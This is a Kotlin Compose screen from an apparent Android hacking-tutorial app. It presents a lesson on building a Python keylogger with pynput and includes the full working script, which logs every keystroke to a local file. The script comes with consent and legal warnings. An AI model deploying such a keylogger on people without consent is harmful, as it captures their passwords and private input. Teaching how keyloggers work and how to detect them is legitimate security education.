package com.example.hackwithpython.lessons

import androidx.compose.foundation.horizontalScroll
import androidx.compose.foundation.layout.padding
import androidx.compose.material3.Text
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.text.BasicText
import androidx.compose.foundation.text.selection.SelectionContainer
import androidx.compose.foundation.verticalScroll
import androidx.compose.material3.Button
import androidx.compose.ui.Modifier
import androidx.compose.runtime.Composable
import androidx.compose.ui.text.TextStyle
import androidx.compose.ui.text.font.FontFamily
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.navigation.NavController
import com.example.hackwithpython.HackerBlack

@Composable
fun Lesson13Screen(navController: NavController) {
    Column(modifier = Modifier.padding(16.dp)
            .verticalScroll(rememberScrollState()),) {
        Text(
            text = "Lesson 13: Building a Simple Keylogger",
            fontWeight = FontWeight.Bold,
            style = androidx.compose.material3.MaterialTheme.typography.headlineMedium,
            modifier = Modifier.padding(vertical = 8.dp)
        )

        // Introduction Section
        Text(
            text = """
                A keylogger is a type of surveillance software that records every keystroke made on a keyboard. 
                While keyloggers can be used for legitimate purposes, such as monitoring employees or children, 
                they are often associated with malicious activities, including stealing sensitive information like passwords and credit card numbers. 
                
                In this lesson, we will build a simple keylogger in Python using the `pynput` library. 
                This keylogger will capture keystrokes and save them to a text file for later analysis. 
                It is essential to remember that building and using keyloggers can raise ethical and legal issues; 
                therefore, always obtain explicit consent from individuals before monitoring their activities.
            """.trimIndent(),
            modifier = Modifier.padding(vertical = 8.dp)
        )

        // Prerequisites
        Text(
            text = "Prerequisites",
            fontWeight = FontWeight.Bold,
            style = androidx.compose.material3.MaterialTheme.typography.headlineMedium,
            modifier = Modifier.padding(vertical = 8.dp)
        )
        Text(
            text = """
                Before we start building our keylogger, ensure you have the following prerequisites:
                - Python installed on your system (preferably version 3.6 or higher).
                - The `pynput` library, which can be installed using pip:
                    ```bash
                    pip install pynput
                    ```
                - Basic knowledge of Python programming and an understanding of how keyboard events work.
            """.trimIndent(),
            modifier = Modifier.padding(vertical = 8.dp)
        )

        // How Keyloggers Work
        Text(
            text = "How Keyloggers Work",
            fontWeight = FontWeight.Bold,
            style = androidx.compose.material3.MaterialTheme.typography.headlineMedium,
            modifier = Modifier.padding(vertical = 8.dp)
        )
        Text(
            text = """
                Keyloggers work by hooking into the keyboard input at the system level. 
                They listen for keyboard events and log them as they occur. Here’s a simplified overview of the keylogging process:
                1. **Hooking into the Keyboard**: The keylogger registers a listener for keyboard events.
                2. **Capturing Keystrokes**: Each time a key is pressed or released, the keylogger captures the event.
                3. **Logging Keystrokes**: The captured keystrokes are logged to a file for later retrieval and analysis.
            """.trimIndent(),
            modifier = Modifier.padding(vertical = 8.dp)
        )

        // Keylogger Implementation
        Text(
            text = "Keylogger Implementation",
            fontWeight = FontWeight.Bold,
            style = androidx.compose.material3.MaterialTheme.typography.headlineMedium,
            modifier = Modifier.padding(vertical = 8.dp)
        )
        Text(
            text = """
                Now, let's implement a simple keylogger using Python and the `pynput` library. 
                We will follow these steps:
                - Import the necessary libraries.
                - Define the log file where we will store the captured keystrokes.
                - Create a function to log the keystrokes.
                - Set up a keyboard listener to capture key events.
                - Start the listener and keep the program running.
            """.trimIndent(),
            modifier = Modifier.padding(vertical = 8.dp)
        )

        // Code Implementation
        Text(
            text = "Code Implementation",
            fontWeight = FontWeight.Bold,
            style = androidx.compose.material3.MaterialTheme.typography.headlineMedium,
            modifier = Modifier.padding(vertical = 8.dp)
        )
        Text(
            text = """
                Here’s a complete implementation of the keylogger:
            """.trimIndent(),
            modifier = Modifier.padding(vertical = 8.dp)
        )

        // Code Example for Keylogger
        Text(
            text = "Keylogger Code",
            fontWeight = FontWeight.Bold,
            style = androidx.compose.material3.MaterialTheme.typography.headlineMedium,
            modifier = Modifier.padding(vertical = 8.dp)
        )

        SelectionContainer {
            BasicText(
                text = """ 
                from pynput import keyboard
                import logging

                # Set up logging to a file
                logging.basicConfig(filename="keylogger_output.txt", level=logging.DEBUG, format='%(asctime)s: %(message)s')

                # Function to log key presses
                def on_press(key):
                    try:
                        logging.info(f'Key {key.char} pressed')
                    except AttributeError:
                        logging.info(f'Special Key {key} pressed')

                # Function to log key releases
                def on_release(key):
                    if key == keyboard.Key.esc:
                        # Stop listener on Escape key press
                        return False

                # Set up the listener
                with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
                    listener.join()
                """.trimIndent(),
                style = TextStyle(
                    fontFamily = FontFamily.Monospace,
                    fontSize = 14.sp,
                    color = HackerBlack
                ),
                modifier = Modifier
                    .padding(12.dp)
                    .horizontalScroll(rememberScrollState())
            )
        }

        Text(
            text = """
                In this code:
                - We import the necessary modules, including `keyboard` from `pynput` and `logging` for output.
                - The `logging.basicConfig` function sets up the log file and format.
                - The `on_press` function is called each time a key is pressed. It logs the key pressed, using a try-except block to handle regular and special keys.
                - The `on_release` function stops the listener when the Escape key is pressed.
                - We set up the listener with the context manager to ensure it runs smoothly.
            """.trimIndent(),
            modifier = Modifier.padding(vertical = 8.dp)
        )

        // Running the Keylogger
        Text(
            text = "Running the Keylogger",
            fontWeight = FontWeight.Bold,
            style = androidx.compose.material3.MaterialTheme.typography.headlineMedium,
            modifier = Modifier.padding(vertical = 8.dp)
        )
        Text(
            text = """
                To run the keylogger, save the code to a Python file, such as `keylogger.py`, and execute it using:
                ```bash
                python keylogger.py
                ```
                After running, the keylogger will start capturing keystrokes and logging them to `keylogger_output.txt`. 
                Press the Escape key to stop the keylogger.
            """.trimIndent(),
            modifier = Modifier.padding(vertical = 8.dp)
        )

        // Important Considerations
        Text(
            text = "Important Considerations",
            fontWeight = FontWeight.Bold,
            style = androidx.compose.material3.MaterialTheme.typography.headlineMedium,
            modifier = Modifier.padding(vertical = 8.dp)
        )
        Text(
            text = """
                While developing and using a keylogger can be informative, there are significant ethical and legal implications to consider:
                - **Legal Compliance**: Unauthorized use of keyloggers can lead to severe legal repercussions. Always obtain consent before monitoring any individual’s activities.
                - **Privacy Concerns**: Respect users' privacy. Keyloggers can collect sensitive information, and misuse can lead to identity theft or other malicious activities.
                - **Security Practices**: If used for legitimate purposes, ensure that the collected data is stored securely and used responsibly.
                - **Detection**: Be aware that many antivirus and security software may detect and block keyloggers as malicious software.
            """.trimIndent(),
            modifier = Modifier.padding(vertical = 8.dp)
        )

        // Conclusion
        Text(
            text = "Conclusion",
            fontWeight = FontWeight.Bold,
            style = androidx.compose.material3.MaterialTheme.typography.headlineMedium,
            modifier = Modifier.padding(vertical = 8.dp)
        )
        Text(
            text = """
                In this lesson, you learned how to build a simple keylogger using Python and the `pynput` library. 
                While keyloggers can serve educational and legitimate purposes, always approach their use with caution, 
                ethical consideration, and legal compliance. In the next lesson, we will explore advanced techniques for detecting and preventing keyloggers.
            """.trimIndent(),
            modifier = Modifier.padding(vertical = 8.dp)
        )

        Spacer(modifier = Modifier.height(32.dp))

        // Button to navigate to the next lesson
        Button(onClick = { navController.navigate("lesson14") }) {
            Text(text = "Next Lesson")
        }
    }
}
